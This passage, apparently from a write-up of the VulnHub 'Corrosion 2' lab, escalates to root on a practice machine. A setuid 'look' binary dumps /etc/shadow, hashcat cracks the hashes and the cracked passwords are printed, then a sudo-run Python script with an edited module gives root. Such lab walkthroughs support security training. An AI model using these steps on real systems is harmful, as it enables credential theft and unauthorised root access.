+<p>Notice the line <code>drwxr-xr-x  2 root root 4096 Sep 17 20:53 Files</code></p>
+<p>It is owned by root.</p>
+<pre class="shell"><code>jaye@corrosion:~/Files$ ls -la
+total 24
+drwxr-xr-x  2 root root  4096 Sep 17 20:53 .
+drwxr-x--x 18 jaye jaye  4096 Sep 17 20:53 ..
+---s--s--x  1 root root 14728 Sep 17 20:53 look
+jaye@corrosion:~/Files$ file look
+look: setuid, setgid executable, regular file, no read permission</code></pre>
+<figure>
+<img src="13.look-gtfobins.png" alt="" /><figcaption>13.look-gtfobins</figcaption>
+</figure>
+<h3 id="etcshadow">/etc/shadow</h3>
+<pre class="shell"><code>jaye@corrosion:~/Files$ ./look
+usage: look [-bdf] [-t char] string [file ...]
+jaye@corrosion:~/Files$ ./look /etc/shadow
+jaye@corrosion:~/Files$ ./look &#39;&#39; /etc/shadow
+root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
+daemon:*:18858:0:99999:7:::
+bin:*:18858:0:99999:7:::
+sys:*:18858:0:99999:7:::
+sync:*:18858:0:99999:7:::
+games:*:18858:0:99999:7:::
+man:*:18858:0:99999:7:::
+lp:*:18858:0:99999:7:::
+mail:*:18858:0:99999:7:::
+news:*:18858:0:99999:7:::
+uucp:*:18858:0:99999:7:::
+proxy:*:18858:0:99999:7:::
+backup:*:18858:0:99999:7:::
+list:*:18858:0:99999:7:::
+irc:*:18858:0:99999:7:::
+gnats:*:18858:0:99999:7:::
+nobody:*:18858:0:99999:7:::
+systemd-network:*:18858:0:99999:7:::
+systemd-resolve:*:18858:0:99999:7:::
+systemd-timesync:*:18858:0:99999:7:::
+messagebus:*:18858:0:99999:7:::
+syslog:*:18858:0:99999:7:::
+_apt:*:18858:0:99999:7:::
+tss:*:18858:0:99999:7:::
+uuidd:*:18858:0:99999:7:::
+tcpdump:*:18858:0:99999:7:::
+avahi-autoipd:*:18858:0:99999:7:::
+usbmux:*:18858:0:99999:7:::
+rtkit:*:18858:0:99999:7:::
+dnsmasq:*:18858:0:99999:7:::
+cups-pk-helper:*:18858:0:99999:7:::
+speech-dispatcher:!:18858:0:99999:7:::
+avahi:*:18858:0:99999:7:::
+kernoops:*:18858:0:99999:7:::
+saned:*:18858:0:99999:7:::
+nm-openvpn:*:18858:0:99999:7:::
+hplip:*:18858:0:99999:7:::
+whoopsie:*:18858:0:99999:7:::
+colord:*:18858:0:99999:7:::
+geoclue:*:18858:0:99999:7:::
+pulse:*:18858:0:99999:7:::
+gnome-initial-setup:*:18858:0:99999:7:::
+gdm:*:18858:0:99999:7:::
+sssd:*:18858:0:99999:7:::
+randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
+systemd-coredump:!!:18886::::::
+tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
+sshd:*:18887:0:99999:7:::
+jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::</code></pre>
+<pre class="shell"><code>jaye@corrosion:~/Files$ ./look &#39;&#39; /etc/shadow-
+root:$6$SK3EWZP5uYSXQITZ$2NgfhBWb4GwdBK7kME2Siv5ZepPOS0D3b6Q2kXsayjijCoVTAb8kP9QcSelvKOnn8GQM.L2nX5D6cyi9S8lOv.:18887:0:99999:7:::
+daemon:*:18858:0:99999:7:::
+bin:*:18858:0:99999:7:::
+sys:*:18858:0:99999:7:::
+sync:*:18858:0:99999:7:::
+games:*:18858:0:99999:7:::
+man:*:18858:0:99999:7:::
+lp:*:18858:0:99999:7:::
+mail:*:18858:0:99999:7:::
+news:*:18858:0:99999:7:::
+uucp:*:18858:0:99999:7:::
+proxy:*:18858:0:99999:7:::
+www-data:$6$XOw808AGQXV8GQ6O$wAMHLQkePxSFEeDrfhuNIQnwYsq33yFdJl1PtSijeg/2SLLwIba.TDGuRvxvBfMjNt.bKVb13b1D/QAwgfpHe/:18887:0:99999:7:::
+backup:*:18858:0:99999:7:::
+list:*:18858:0:99999:7:::
+irc:*:18858:0:99999:7:::
+gnats:*:18858:0:99999:7:::
+nobody:*:18858:0:99999:7:::
+systemd-network:*:18858:0:99999:7:::
+systemd-resolve:*:18858:0:99999:7:::
+systemd-timesync:*:18858:0:99999:7:::
+messagebus:*:18858:0:99999:7:::
+syslog:*:18858:0:99999:7:::
+_apt:*:18858:0:99999:7:::
+tss:*:18858:0:99999:7:::
+uuidd:*:18858:0:99999:7:::
+tcpdump:*:18858:0:99999:7:::
+avahi-autoipd:*:18858:0:99999:7:::
+usbmux:*:18858:0:99999:7:::
+rtkit:*:18858:0:99999:7:::
+dnsmasq:*:18858:0:99999:7:::
+cups-pk-helper:*:18858:0:99999:7:::
+speech-dispatcher:!:18858:0:99999:7:::
+avahi:*:18858:0:99999:7:::
+kernoops:*:18858:0:99999:7:::
+saned:*:18858:0:99999:7:::
+nm-openvpn:*:18858:0:99999:7:::
+hplip:*:18858:0:99999:7:::
+whoopsie:*:18858:0:99999:7:::
+colord:*:18858:0:99999:7:::
+geoclue:*:18858:0:99999:7:::
+pulse:*:18858:0:99999:7:::
+gnome-initial-setup:*:18858:0:99999:7:::
+gdm:*:18858:0:99999:7:::
+sssd:*:18858:0:99999:7:::
+randy:$6$IQdKZxEAJEIy7zhq$aRt4Tvv8K4NnkSjp2t0JL5NR/oa.KvE/8VsvPkK.WEddBt1/rBlwKhIIQBycyRN3Oc8aa6jBlbFPnc0QfFqBX/:18886:0:99999:7:::
+systemd-coredump:!!:18886::::::
+tomcat:!:18887:0:99999:7:::
+sshd:*:18887:0:99999:7:::</code></pre>
+<h2 id="cracking-passwords.">Cracking passwords.</h2>
+<p>It has been long since I used hashcat…</p>
+<p>This machine is golden for nostalgia or practice.</p>
+<pre class="shell"><code>cat corrosion-2.hashes        
+root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.
+randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/
+tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1
+jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0
+randyO:$6$IQdKZxEAJEIy7zhq$aRt4Tvv8K4NnkSjp2t0JL5NR/oa.KvE/8VsvPkK.WEddBt1/rBlwKhIIQBycyRN3Oc8aa6jBlbFPnc0QfFqBX/
+www-data:$6$XOw808AGQXV8GQ6O$wAMHLQkePxSFEeDrfhuNIQnwYsq33yFdJl1PtSijeg/2SLLwIba.TDGuRvxvBfMjNt.bKVb13b1D/QAwgfpHe/
+rootO:$6$SK3EWZP5uYSXQITZ$2NgfhBWb4GwdBK7kME2Siv5ZepPOS0D3b6Q2kXsayjijCoVTAb8kP9QcSelvKOnn8GQM.L2nX5D6cyi9S8lOv.
+
+hashcat -w3 -O -m 1800 -a 0 --user -o cracked.corrosion-2.hashes corrosion-2.hashes  /usr/share/wordlists/rockyou.txt
+...
+Session..........: hashcat
+Status...........: Running
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: corrosion-2.hashes
+Time.Started.....: Fri Dec 24 00:21:18 2021 (3 mins, 24 secs)
+Time.Estimated...: Fri Dec 24 00:26:58 2021 (2 mins, 16 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   126.8 kH/s (70.00ms) @ Accel:8 Loops:256 Thr:1024 Vec:1
+Recovered........: 4/7 (57.14%) Digests, 4/7 (57.14%) Salts
+Progress.........: 59994224/100410821 (59.75%)
+Rejected.........: 1060976/59994224 (1.77%)
+Restore.Point....: 8438595/14344403 (58.83%)
+Restore.Sub.#1...: Salt:5 Amplifier:0-1 Iteration:3072-3328
+Candidates.#1....: eastcoast2 -&gt; diewithdignity
+Hardware.Mon.#1..: Temp: 72c Fan: 77% Util:100% Core:1830MHz Mem:6801MHz Bus:16
+...
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: corrosion-2.hashes
+Time.Started.....: Fri Dec 24 00:21:18 2021 (5 mins, 40 secs)
+Time.Estimated...: Fri Dec 24 00:26:58 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   124.9 kH/s (52.54ms) @ Accel:8 Loops:256 Thr:1024 Vec:1
+Recovered........: 5/7 (71.43%) Digests, 5/7 (71.43%) Salts
+Progress.........: 100410821/100410821 (100.00%)
+Rejected.........: 1710345/100410821 (1.70%)
+Restore.Point....: 14344403/14344403 (100.00%)
+Restore.Sub.#1...: Salt:6 Amplifier:0-1 Iteration:4864-5000
+Candidates.#1....: $HEX[2a6a6f686e632a] -&gt; $HEX[042a0337c2a156616d6f732103]
+Hardware.Mon.#1..: Temp: 71c Fan: 80% Util: 99% Core:1845MHz Mem:6801MHz Bus:16
+
+Started: Fri Dec 24 00:21:16 2021
+Stopped: Fri Dec 24 00:26:59 2021
+
+
+cat cracked.corrosion-2.hashes
+$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:melehifokivai
+$6$XOw808AGQXV8GQ6O$wAMHLQkePxSFEeDrfhuNIQnwYsq33yFdJl1PtSijeg/2SLLwIba.TDGuRvxvBfMjNt.bKVb13b1D/QAwgfpHe/:pass
+$6$SK3EWZP5uYSXQITZ$2NgfhBWb4GwdBK7kME2Siv5ZepPOS0D3b6Q2kXsayjijCoVTAb8kP9QcSelvKOnn8GQM.L2nX5D6cyi9S8lOv.:pass123
+$6$IQdKZxEAJEIy7zhq$aRt4Tvv8K4NnkSjp2t0JL5NR/oa.KvE/8VsvPkK.WEddBt1/rBlwKhIIQBycyRN3Oc8aa6jBlbFPnc0QfFqBX/:pass
+$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:07051986randy</code></pre>
+<p>randy:07051986randy</p>
+<h2 id="randy">randy</h2>
+<pre class="shell"><code>jaye@corrosion:~/Files$ su randy
+Password: 
+randy@corrosion:/home/jaye/Files$ cd
+randy@corrosion:~$ whoami
+randy
+randy@corrosion:~$ id
+uid=1000(randy) gid=1000(randy) groups=1000(randy),27(sudo)
+randy@corrosion:~$ pwd
+/home/randy
+randy@corrosion:~$ date
+Thu 23 Dec 2021 05:29:10 PM MST</code></pre>
+<h2 id="ssh-as-randy">ssh as randy</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Friday 24 December 2021 12:30:19 AM IST 2021.12.24 00:30:19
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+ssh randy@$RHOST -t /bin/bash
+randy@192.168.56.81&#39;s password: 
+randy@corrosion:~$ whoami
+randy
+randy@corrosion:~$ id
+uid=1000(randy) gid=1000(randy) groups=1000(randy),27(sudo)
+randy@corrosion:~$ export TERM=&quot;xterm-256color&quot;</code></pre>
+<figure>
+<img src="14.ssh-as-randy.png" alt="" /><figcaption>14.ssh-as-randy</figcaption>
+</figure>
+<pre class="shell"><code>randy@corrosion:~$ sudo -l
+[sudo] password for randy: 
+Matching Defaults entries for randy on corrosion:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User randy may run the following commands on corrosion:
+    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
+randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
+root@corrosion:/home/randy# whoami
+root
+root@corrosion:/home/randy# id
+uid=0(root) gid=0(root) groups=0(root)
+root@corrosion:/home/randy# 
+root@corrosion:/home/randy# cd /root
+root@corrosion:~# ls -la
+total 44
+drw-------  5 root root 4096 Sep 20 20:18 .
+drwxr-xr-x 20 root root 4096 Sep 16 17:19 ..
+-rw-r--r--  1 root root    5 Sep 20 20:20 .bash_history
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Aug 19 04:41 .cache
+drwxr-xr-x  3 root root 4096 Sep 16 22:01 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-------  1 root root    0 Sep 17 21:51 .python_history
+-rw-r--r--  1 root root   33 Sep 17 03:08 root.txt
+-rw-r--r--  1 root root   66 Sep 16 23:51 .selected_editor
+drwxr-xr-x  3 root root 4096 Sep 16 17:22 snap
+-rw-r--r--  1 root root  181 Sep 17 21:48 .wget-hsts
+</code></pre>
+<h2 id="flag-rootroot.txt">flag /root/root.txt</h2>
+<pre class="shell"><code>root@corrosion:~# cat root.txt
+2fdbf8d4f894292361d6c72c8e833a4b</code></pre>
+<figure>
+<img src="15.flag-root-root-txt.png" alt="" /><figcaption>15.flag-root-root-txt</figcaption>
+</figure>
+<h2 id="how-did-i-root">how did I root?</h2>
+<p>Remeber a while ago I was trying to open nano or vi?</p>
+<p>I did and edited the file.</p>
+<figure>
+<img src="16.the-magic-spell-to-root.png" alt="" /><figcaption>16.the-magic-spell-to-root</figcaption>
+</figure>
+<h2 id="rooted">Rooted</h2>
+<figure>
+<img src="17.and-rooted.png" alt="" /><figcaption>17.and-rooted</figcaption>
+</figure>
+<figure>
+<img src="18.cat-etc-shadow.png" alt="" /><figcaption>18.cat-etc-shadow</figcaption>
+</figure>
+<h2 id="how-to-root">How to root</h2>
+<p>First of all, I enjoyed it more than I could get frustrated by it.</p>
+<p>That is simply because, three major things were nostalgic or easy for me.</p>
+<p>This box has only taken me less than two hours. Some other week or month, and it might have taken a whole day.</p>
+<ol type="1">
+<li>msfvenom: I did create a lot of war files while I was attacking windows machine in HTB. I just mis it.</li>
+<li>hashcat: I cannot believe I had to use it after so long.</li>
+<li>editing python script for root: I did it recently in some other box, so I knew that it will factor in sooner or later.</li>
+</ol>
+<p>Now, how to hack.</p>
+<ol type="1">
+<li>Find web, find other web.</li>
+<li>Find backup.</li>
+<li>You need to be manager of your own destiny.</li>
+<li>You need venmous payload.</li>
+<li>Get a reverse shell.</li>
+<li>Become a user. Password reuse be damned!</li>
+<li>Run as root.</li>
+<li>Crack the hashes.</li>
+<li>Become a user.</li>
+<li>Update the dependency. Find it in standard locations.</li>
+<li>Execute and be root.</li>
+<li>???</li>
+<li>Profit</li>
+</ol>
